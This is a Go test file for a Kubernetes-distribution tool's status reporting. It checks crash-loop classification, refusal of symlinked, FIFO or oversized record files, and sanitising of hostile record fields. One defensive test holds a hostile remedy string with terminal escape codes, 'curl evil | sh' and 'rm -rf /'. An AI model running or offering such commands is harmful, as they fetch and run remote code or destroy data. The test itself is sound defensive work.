/*
Copyright The k3sm Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package status

import (
	"bytes"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"golang.org/x/sys/unix"

	"k3sm.io/k3sm/pkg/dataroot"
	"k3sm.io/k3sm/pkg/executor"
)

func TestClassifyCrashLoop(t *testing.T) {
	t.Parallel()
	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
	path := "/var/lib/k3sm/server/crashloop.json"
	crash := func(ago time.Duration, comp string) executor.Crash {
		return executor.Crash{At: now.Add(-ago), Component: comp, Origin: executor.CrashOriginCrash,
			Detail: "token=REDACTED secret material"}
	}
	// A component that never came up at all: the origin cmd/k3sm records from
	// executor.Start's error, which the row must not describe as a crash.
	bringUp := func(ago time.Duration, comp string) executor.Crash {
		return executor.Crash{At: now.Add(-ago), Component: comp, Origin: executor.CrashOriginBringUp,
			Detail: "token=REDACTED secret material"}
	}
	// A record written before the daemon counted bring-up failures: no origin
	// key at all, and it must keep reading as a crash.
	legacy := func(ago time.Duration, comp string) executor.Crash {
		return executor.Crash{At: now.Add(-ago), Component: comp, Detail: "token=REDACTED secret material"}
	}
	// An HA scheduler or controller-manager that exited on a lost leader lease:
	// recorded, but not a failure.
	leaderLost := func(ago time.Duration, comp string) executor.Crash {
		return executor.Crash{At: now.Add(-ago), Component: comp, Origin: executor.CrashOriginLeaderLost,
			Detail: "token=REDACTED secret material"}
	}
	tripped := now.Add(-time.Minute)

	tests := []struct {
		name        string
		rec         executor.CrashRecord
		err         error
		wantPosture CrashLoopPosture
		wantIn      []string
		wantNotIn   []string
	}{
		{"absent or empty is quiet", executor.CrashRecord{}, nil, PostureQuiet, nil, nil},
		{"a slow bring-up streak shows the backoff", executor.CrashRecord{SlowStreak: 3, LastSlowAt: &tripped,
			Crashes: []executor.Crash{{At: tripped, Component: "kube-apiserver", Origin: executor.CrashOriginBringUpSlow}}},
			nil, PostureRestarting, []string{"backing off until " + tripped.Add(2*time.Minute).Format(time.RFC3339), "3 consecutive", "parks at"}, nil},
		{"an elapsed slow backoff shows the attempt in progress", executor.CrashRecord{SlowStreak: 1, LastSlowAt: &tripped,
			Crashes: []executor.Crash{{At: tripped, Component: "kube-apiserver", Origin: executor.CrashOriginBringUpSlow}}},
			nil, PostureRestarting, []string{"bring-up attempt 2 in progress", "1 consecutive", "parks at"}, []string{"backing off"}},
		{"one crash in the window is quiet (a fact for the log, not a pattern)",
			executor.CrashRecord{Crashes: []executor.Crash{crash(time.Minute, "kine")}}, nil, PostureQuiet, nil, nil},
		{"two crashes in the window is restarting",
			executor.CrashRecord{Crashes: []executor.Crash{crash(3*time.Minute, "kine"), crash(time.Minute, "kine")}}, nil,
			PostureRestarting, []string{"restarted 2 times", "kine", "trips at"}, nil},
		{"crashes outside the window do not count",
			executor.CrashRecord{Crashes: []executor.Crash{crash(2*executor.CrashLoopWindow, "kine"), crash(time.Minute, "kine")}}, nil,
			PostureQuiet, nil, nil},
		{"tripped is parked whatever the clock says now",
			executor.CrashRecord{Crashes: []executor.Crash{crash(time.Minute, "kube-apiserver")}, TrippedAt: &tripped}, nil,
			PostureParked, []string{"tripped", "kube-apiserver", "parked", "--clear-crashloop", path}, nil},
		{"two bring-up failures say the control plane never came up",
			executor.CrashRecord{Crashes: []executor.Crash{bringUp(3*time.Minute, "kine"), bringUp(time.Minute, "provision/certs")}}, nil,
			PostureRestarting, []string{"never came up (last: provision/certs)", "2 failures", "trips at"},
			[]string{"crashed", "restarted"}},
		{"a tripped bring-up record says never came up, not crashed",
			executor.CrashRecord{Crashes: []executor.Crash{bringUp(time.Minute, "kube-apiserver")}, TrippedAt: &tripped}, nil,
			PostureParked, []string{"never came up (last: kube-apiserver)", "parked", "--clear-crashloop", path},
			[]string{"crashed"}},
		{"a permanent bring-up park names the fix, not only the record",
			executor.CrashRecord{Crashes: []executor.Crash{func() executor.Crash {
				c := bringUp(time.Minute, "provision/kine")
				c.Permanent, c.Remedy = true, executor.NoGoToolchainRemedy
				return c
			}()}, TrippedAt: &tripped}, nil,
			PostureParked, []string{"never came up (last: provision/kine)", "cannot heal on retry", "sudo k3sm install", "--clear-crashloop"},
			[]string{"crashed", path}},
		{"a pre-origin record still reads as a crash",
			executor.CrashRecord{Crashes: []executor.Crash{legacy(3*time.Minute, "kine"), legacy(time.Minute, "kine")}}, nil,
			PostureRestarting, []string{"restarted 2 times", "last crash: kine"}, []string{"never came up"}},
		{"one leader-lease loss is quiet (the wide view notes it)",
			executor.CrashRecord{Crashes: []executor.Crash{leaderLost(time.Minute, "kube-controller-manager")}}, nil,
			PostureQuiet, nil, nil},
		{"two leader-lease losses say quorum is flapping, not that anything crashed",
			executor.CrashRecord{Crashes: []executor.Crash{leaderLost(3*time.Minute, "kube-scheduler"), leaderLost(time.Minute, "kube-controller-manager")}}, nil,
			PostureRestarting, []string{"lost the leader lease 2 times", "kube-controller-manager", "not a crash", "trips at 10"},
			[]string{"restarted", "last crash", "never came up"}},
		{"leader-lease losses do not count as crashes, and one crash among them names the crash",
			executor.CrashRecord{Crashes: []executor.Crash{crash(3*time.Minute, "kine"), leaderLost(2*time.Minute, "kube-scheduler"), leaderLost(time.Minute, "kube-scheduler")}}, nil,
			PostureRestarting, []string{"lost the leader lease 2 times"}, []string{"restarted"}},
		{"a crash count names the last crash, not a later lease loss",
			executor.CrashRecord{Crashes: []executor.Crash{crash(4*time.Minute, "kine"), crash(3*time.Minute, "kube-apiserver"), leaderLost(time.Minute, "kube-scheduler")}}, nil,
			PostureRestarting, []string{"restarted 2 times", "last crash: kube-apiserver"}, []string{"kube-scheduler"}},
		{"a park on repeated leader-lease loss says so and names quorum",
			executor.CrashRecord{Crashes: []executor.Crash{leaderLost(2*time.Minute, "kube-scheduler"), leaderLost(time.Minute, "kube-controller-manager")}, TrippedAt: &tripped}, nil,
			PostureParked, []string{"repeated leader-lease loss", "kube-controller-manager", "etcd quorum", "parked", "--clear-crashloop"},
			[]string{"crashed", "never came up"}},
		{"permission denied is unreadable, named as the user's posture",
			executor.CrashRecord{}, os.ErrPermission, PostureUnreadable, []string{"not readable by this user"}, nil},
		{"any other read error is unreadable with the error",
			executor.CrashRecord{}, errors.New("disk on fire"), PostureUnreadable, []string{"disk on fire"}, nil},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			v := ClassifyCrashLoop(tc.rec, tc.err, path, now)
			if v.Posture != tc.wantPosture {
				t.Fatalf("posture = %v, want %v (%+v)", v.Posture, tc.wantPosture, v)
			}
			for _, w := range tc.wantIn {
				if !strings.Contains(v.Detail+"\n"+v.Remedy, w) {
					t.Errorf("verdict lacks %q: %+v", w, v)
				}
			}
			for _, w := range tc.wantNotIn {
				if strings.Contains(v.Detail+"\n"+v.Remedy, w) {
					t.Errorf("verdict carries %q: %+v", w, v)
				}
			}
			// The record's detail field is never quoted: it is redacted, but the
			// status report is what an operator pastes into a public issue.
			if strings.Contains(v.Detail+v.Remedy, "secret material") || strings.Contains(v.Detail+v.Remedy, "REDACTED") {
				t.Errorf("verdict quotes the record's detail field: %+v", v)
			}
		})
	}
}

func TestApplyCrashLoopOnTheServerRow(t *testing.T) {
	t.Parallel()
	running := func() Row {
		return Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
	}
	t.Run("parked is a FAIL over a running row, with the remedy", func(t *testing.T) {
		row := running()
		applyCrashLoop(&row, CrashLoopVerdict{Posture: PostureParked, Detail: "d", Remedy: "r"})
		if row.Severity != SeverityFail || row.State != StateCrashLoop || row.Remedy != "r" || row.Wide["crash-loop"] != "tripped" {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("restarting is a WARN over a running row", func(t *testing.T) {
		row := running()
		applyCrashLoop(&row, CrashLoopVerdict{Posture: PostureRestarting, Detail: "d", Remedy: "r"})
		if row.Severity != SeverityWarn || row.State != StateCrashLoop || row.Detail != "d" {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("restarting never softens a row launchd already failed", func(t *testing.T) {
		row := Row{Name: RowServer, State: StateFailed, Severity: SeverityFail, Detail: "1 run, last exit 1", Wide: map[string]string{}}
		applyCrashLoop(&row, CrashLoopVerdict{Posture: PostureRestarting, Detail: "d"})
		if row.Severity != SeverityFail {
			t.Fatalf("severity softened: %+v", row)
		}
	})
	t.Run("unreadable is a wide note, never a severity", func(t *testing.T) {
		row := running()
		applyCrashLoop(&row, CrashLoopVerdict{Posture: PostureUnreadable, Detail: "not readable"})
		if row.Severity != SeverityOK || row.Wide["crash-loop"] != "not readable" {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("a leader-lease loss is a wide note on a quiet row, never a severity", func(t *testing.T) {
		row := running()
		applyCrashLoop(&row, CrashLoopVerdict{Posture: PostureQuiet, LeaderLost: "1 in the last 10m0s"})
		if row.Severity != SeverityOK || row.Wide["leader-lost"] != "1 in the last 10m0s" {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("quiet changes nothing", func(t *testing.T) {
		row := running()
		applyCrashLoop(&row, CrashLoopVerdict{})
		if row.Severity != SeverityOK || len(row.Wide) != 0 {
			t.Fatalf("%+v", row)
		}
	})
}

// The collector reads the record with the daemon's owned reader: a tripped
// record makes the server row FAIL; a record a plain user cannot read leaves
// the row alone and notes why.
func TestCollectorServerRowReadsTheCrashRecord(t *testing.T) {
	t.Parallel()
	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
	tripped := now.Add(-time.Minute)
	rec := executor.CrashRecord{Crashes: []executor.Crash{{At: tripped, Component: "kine"}}, TrippedAt: &tripped}
	b, _ := json.Marshal(rec)

	t.Run("tripped record fails the row", func(t *testing.T) {
		workDir := t.TempDir()
		if err := os.WriteFile(executor.CrashLoopPath(workDir), b, 0o600); err != nil {
			t.Fatal(err)
		}
		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
		c.crashLoop(&row)
		if row.Severity != SeverityFail || !strings.Contains(row.Detail, "kine") || !strings.Contains(row.Remedy, "--clear-crashloop") {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("unreadable record is noted, not judged", func(t *testing.T) {
		if os.Geteuid() == 0 {
			t.Skip("root reads a mode-0000 file")
		}
		workDir := t.TempDir()
		if err := os.WriteFile(executor.CrashLoopPath(workDir), b, 0o000); err != nil {
			t.Fatal(err)
		}
		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
		c.crashLoop(&row)
		if row.Severity != SeverityOK || !strings.Contains(row.Wide["crash-loop"], "not readable") {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("absent record changes nothing", func(t *testing.T) {
		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: t.TempDir()}, Now: func() time.Time { return now }}
		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
		c.crashLoop(&row)
		if row.Severity != SeverityOK || len(row.Wide) != 0 {
			t.Fatalf("%+v", row)
		}
	})
}

// TestCrashRecordRowRefusesSymlinkFIFOAndOversize pins that status reads the
// crash-loop record through the bounded, no-follow, regular-file-only reader.
// The work dir is writable by the service user, so each planted shape is one a
// plain os.ReadFile would honour: a symlink to a valid tripped record (followed,
// FAIL), a FIFO (the open blocks, status hangs) and a valid tripped record
// padded past executor.CrashRecordMaxBytes (parsed whole, FAIL). Each must
// render as the unreadable note on an otherwise untouched row instead. A
// normal record still renders, and a missing one is no record.
func TestCrashRecordRowRefusesSymlinkFIFOAndOversize(t *testing.T) {
	t.Parallel()
	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
	tripped := now.Add(-time.Minute)
	rec := executor.CrashRecord{Crashes: []executor.Crash{{At: tripped, Component: "kine"}}, TrippedAt: &tripped}
	valid, err := json.Marshal(rec)
	if err != nil {
		t.Fatal(err)
	}

	// collect runs the read with a deadline, so a regression that blocks on
	// the FIFO fails here instead of hanging the package.
	collect := func(t *testing.T, workDir string) Row {
		t.Helper()
		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
		done := make(chan Row, 1)
		go func() {
			row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
			c.crashLoop(&row)
			done <- row
		}()
		select {
		case row := <-done:
			return row
		case <-time.After(5 * time.Second):
			t.Fatal("crash-loop read did not return within 5s (blocked on a planted FIFO?)")
			return Row{}
		}
	}
	assertUnreadable := func(t *testing.T, row Row) {
		t.Helper()
		if row.Severity != SeverityOK || row.State != StateRunning || row.Detail != "" || row.Remedy != "" {
			t.Fatalf("a refused record judged the row: %+v", row)
		}
		if !strings.HasPrefix(row.Wide["crash-loop"], "crash-loop record unreadable") {
			t.Fatalf("crash-loop note = %q, want the unreadable note", row.Wide["crash-loop"])
		}
	}

	t.Run("symlink", func(t *testing.T) {
		t.Parallel()
		workDir := t.TempDir()
		target := filepath.Join(t.TempDir(), "elsewhere.json")
		if err := os.WriteFile(target, valid, 0o600); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(target, executor.CrashLoopPath(workDir)); err != nil {
			t.Fatal(err)
		}
		assertUnreadable(t, collect(t, workDir))
	})
	t.Run("fifo", func(t *testing.T) {
		t.Parallel()
		workDir := t.TempDir()
		if err := unix.Mkfifo(executor.CrashLoopPath(workDir), 0o600); err != nil {
			t.Fatal(err)
		}
		assertUnreadable(t, collect(t, workDir))
	})
	t.Run("oversize", func(t *testing.T) {
		t.Parallel()
		workDir := t.TempDir()
		// A valid record padded with JSON whitespace: os.ReadFile plus
		// json.Unmarshal would accept it, so only the bound refuses it.
		big := append(append([]byte{}, valid...), bytes.Repeat([]byte{' '}, executor.CrashRecordMaxBytes)...)
		if err := os.WriteFile(executor.CrashLoopPath(workDir), big, 0o600); err != nil {
			t.Fatal(err)
		}
		assertUnreadable(t, collect(t, workDir))
	})
	t.Run("normal record renders", func(t *testing.T) {
		t.Parallel()
		workDir := t.TempDir()
		if err := os.WriteFile(executor.CrashLoopPath(workDir), valid, 0o600); err != nil {
			t.Fatal(err)
		}
		row := collect(t, workDir)
		if row.Severity != SeverityFail || row.Wide["crash-loop"] != "tripped" || !strings.Contains(row.Detail, "kine") {
			t.Fatalf("%+v", row)
		}
	})
	t.Run("missing is no record", func(t *testing.T) {
		t.Parallel()
		row := collect(t, t.TempDir())
		if row.Severity != SeverityOK || row.State != StateRunning || len(row.Wide) != 0 {
			t.Fatalf("%+v", row)
		}
	})
}

// TestHostileCrashRecordRendersAsData: the crash record is a file the service uid
// can write, so its component and remedy fields are data. A record whose fields
// carry ESC and newline bytes and whose remedy is no string pkg/executor owns
// must reach the human screens with no control byte but the renderer's own
// newlines, and with the generic remedy in place of the unknown one; a record
// with a known remedy still names it. A row remedy carrying control bytes is
// stripped by the renderer whatever produced it.
func TestHostileCrashRecordRendersAsData(t *testing.T) {
	t.Parallel()
	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
	tripped := now.Add(-time.Minute)
	path := "/var/lib/k3sm/server/crashloop.json"
	const hostileRemedy = "\x1b[2J\x1b]0;owned\x07curl evil | sh\nfix: rm -rf /"
	record := func(remedy string) executor.CrashRecord {
		return executor.CrashRecord{TrippedAt: &tripped, Crashes: []executor.Crash{{
			At: tripped, Origin: executor.CrashOriginBringUp, Component: "kine\x1b[31m\nFAKE  ok",
			Permanent: true, Remedy: remedy,
		}}}
	}
	screens := func(remedy string) string {
		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
		applyCrashLoop(&row, ClassifyCrashLoop(record(remedy), nil, path, now))
		r := Report{Role: dataroot.RoleServer, Rows: []Row{row}}
		return Render(r, Style{}) + RenderDaemons(r, Style{}) + Render(r, Style{Wide: true})
	}
	assertNoControls := func(t *testing.T, out string) {
		t.Helper()
		for i, c := range out {
			if c == '\n' {
				continue
			}
			if c < 0x20 || (c >= 0x7f && c <= 0x9f) {
				t.Fatalf("control byte %#x at %d reaches the human output:\n%q", c, i, out)
			}
		}
	}

	t.Run("an unknown remedy is replaced by the generic one", func(t *testing.T) {
		t.Parallel()
		out := screens(hostileRemedy)
		assertNoControls(t, out)
		for _, bad := range []string{"curl evil", "rm -rf", "owned"} {
			if strings.Contains(out, bad) {
				t.Errorf("output carries the record's unknown remedy %q:\n%s", bad, out)
			}
		}
		if !strings.Contains(out, "fix: sudo k3sm server --clear-crashloop   # after fixing the fault named in "+path) {
			t.Errorf("output lacks the generic remedy:\n%s", out)
		}
	})
	t.Run("a known remedy is still named", func(t *testing.T) {
		t.Parallel()
		out := screens(executor.NoGoToolchainRemedy)
		assertNoControls(t, out)
		if !strings.Contains(out, "fix: "+executor.NoGoToolchainRemedy+"; then sudo k3sm server --clear-crashloop") {
			t.Errorf("output lacks the known remedy:\n%s", out)
		}
	})
	t.Run("the renderer strips control bytes from every remedy step", func(t *testing.T) {
		t.Parallel()
		row := Row{Name: RowServer, State: StateCrashLoop, Severity: SeverityFail, Detail: "d",
			Remedy: "first\x1b[2J step\nsecond\x07 step\r", Wide: map[string]string{}}
		out := RenderDaemons(Report{Role: dataroot.RoleServer, Rows: []Row{row}}, Style{})
		assertNoControls(t, out)
		for _, want := range []string{"fix: first[2J step\n", "fix: second step\n"} {
			if !strings.Contains(out, want) {
				t.Errorf("output lacks %q:\n%q", want, out)
			}
		}
	})
}
